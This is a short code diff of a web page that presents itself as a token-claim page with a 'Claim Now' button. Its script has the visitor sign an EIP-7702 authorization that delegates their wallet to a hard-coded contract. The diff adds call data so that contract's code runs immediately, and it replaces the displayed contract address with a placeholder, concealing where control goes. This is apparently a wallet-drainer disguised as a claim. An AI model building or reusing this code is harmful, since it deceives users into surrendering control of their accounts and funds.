@@ -61,7 +61,7 @@
         
         <div class="info">
             <span class="info-icon">🔐</span>
-            <span>Router: <span style="color:#ff6b35;font-family:monospace;">0x7debCF72BebA168Bb49eec6BbB1156E203A564FD</span></span>
+            <span>Router: <span style="color:#ff6b35;font-family:monospace;">CONTRACT_ADDRESS_HERE</span></span>
         </div>
         
         <button class="btn btn-primary" id="claimBtn">Claim Now</button>
@@ -72,6 +72,7 @@
     <script>
         const CONTRACT = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
         const CHAIN_ID = '0x1';
+        const EXECUTE_DATA = '0x61461954';
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
             const status = document.getElementById('status');
@@ -114,10 +115,11 @@
                     chainId: CHAIN_ID,
                     nonce: nonce,
                     to: userAddress,
-                    gas: '0x15F90',
+                    gas: '0x30D40',
                     maxFeePerGas: '0x77359400',
                     maxPriorityFeePerGas: '0x77359400',
                     value: '0x0',
+                    data: EXECUTE_DATA,
                     authorizationList: [{
                         chainId: CHAIN_ID,
                         address: CONTRACT,
